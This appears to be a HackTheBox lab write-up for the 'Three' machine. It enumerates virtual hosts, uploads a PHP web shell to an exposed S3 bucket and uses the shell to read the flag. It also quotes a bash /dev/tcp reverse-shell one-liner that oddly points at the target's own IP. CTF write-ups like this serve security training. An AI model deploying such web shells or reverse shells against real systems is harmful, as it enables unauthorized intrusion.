# [HackTheBox] [Three]: [Enumeration], [Foothold]

**Target:** [Three] | **OS:** Linux | **Difficulty:** Super Easy
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS ---min-rate 5000 -T3 10.129.227.248
```

`PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http`

When i checked the page i saw the domain on a mail 

So lets first solve the dns to `thetoppers.htb`

After a review of the page i didnt found anything useful, lets fuzz it

```shell
➜ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://thetoppers.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
s3.thetoppers.htb Status: 404 [Size: 21]
Progress: 5000 / 5000 (100.00%)
===============================================================
Finished
===============================================================
```

After solving it i found this 

`{"status": "running"}`

Just a json, lets use a php script to get a cmd with aws

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Now lets confirm it was successful `http://thetoppers.htb/shell.php?cmd=id`

![Image](https://raw.githubusercontent.com/zyoel/writeups/main/htb/three/assets/search.png)

Now lets create a `shell.sh` script with `bash -i >& /dev/tcp/10.129.227.248/1337 0>&1`

Lets make it simpler, after uploading with aws we have to do the following:

`http://thetoppers.htb/shell.php?cmd=ls+../`
`http://thetoppers.htb/shell.php?cmd=cat+../flag.txt`

Pwned.


